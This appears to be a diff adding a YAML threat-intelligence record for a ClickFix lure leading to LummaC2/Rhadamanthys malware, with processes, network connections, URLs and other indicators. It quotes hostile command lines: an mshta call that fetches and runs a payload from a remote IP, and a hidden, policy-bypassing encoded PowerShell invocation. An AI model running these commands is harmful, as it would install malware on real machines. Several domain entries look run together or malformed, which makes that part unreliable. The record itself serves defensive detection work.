@@ -1,0 +1,52 @@
+description: "A multi\u2011stage malware chain delivered via a ClickFix lure that\
+  \ uses mshta, PowerShell and .NET loaders with steganographic shellcode."
+attribution: Rhadamanthys
+malware_families:
+- LummaC2
+- Rhadamanthys
+- ClickFix
+TTPs:
+  processes:
+  - mshta.exe
+  - powershell.exe
+  - explorer.exe
+  commandline:
+  - mshta http://81.90.29.64/ebc/rps.gz
+  - powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -WindowStyle Hidden
+    -EncodedCommand <encoded>
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: mshta.exe
+    destination: 81.90.29.64
+    port: 80
+  - executable: powershell.exe
+    destination: corezea.com
+    port: 80
+  file_activity: []
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes: []
+  ips:
+  - 172.66.44.154
+  domains:
+  - f6b04000.consent-verify.pages.dev
+  - 81.90.29.64
+  - corezea.com
+  - shopsquatje.subendavo.su
+  - conxmsw.su
+  - sunarroxp.susqueaue
+  - suozonelf.suexposqw
+  - susquatje.suvicareu.suexplorer.exe
+  urls:
+  - http://81.90.29.64/
+  - http://corezea.com/ebchypudyk
+  - https://f6b04000.consent-verify.pages.dev/
+authors:
+- Anna Pham
+reference: https://www.huntress.com/blog/clickfix-malware-buried-in-images
+date_of_publication: October 01, 2025
+file_creation_date: November 29, 2025
